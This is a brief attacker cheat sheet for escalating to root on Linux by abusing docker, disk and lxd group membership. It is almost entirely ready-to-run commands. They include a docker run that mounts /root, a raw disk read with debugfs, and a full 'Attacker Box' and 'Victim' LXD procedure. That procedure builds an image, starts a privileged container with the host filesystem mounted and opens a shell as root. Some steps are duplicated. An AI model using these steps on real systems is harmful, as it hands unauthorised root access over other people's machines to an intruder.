# GTFO Groups

### Docker

Try to use an existing image. You can mount directories from the host, and therefore read/write all files.

```text
docker run -v /root:/mnt/xct -ti ubuntu
```

### Disk

Privileged File Read: `debugfs /dev/sdax`

### LXD

On Attacker Box:

```bash
sudo apt install lxd zfsutils-linux
usermod --append --groups lxd xct
lxd init (choose dir instead of zfs)
git clone  https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
./build-alpine
lxc launch ubuntu:18.04
lxc list

git clone  https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
./build-alpine
```

Upload the .tar.gz that is built.

On Victim:

```bash
lxd init
lxc image import ./apline-v3.10-x86_64-20191008_1227.tar.gz --alias xct
lxc image list
lxc init xct ignite -c security.privileged=true
lxc config device add ignite xct disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh
id
```

Host file system will be mounted in /mnt/root.

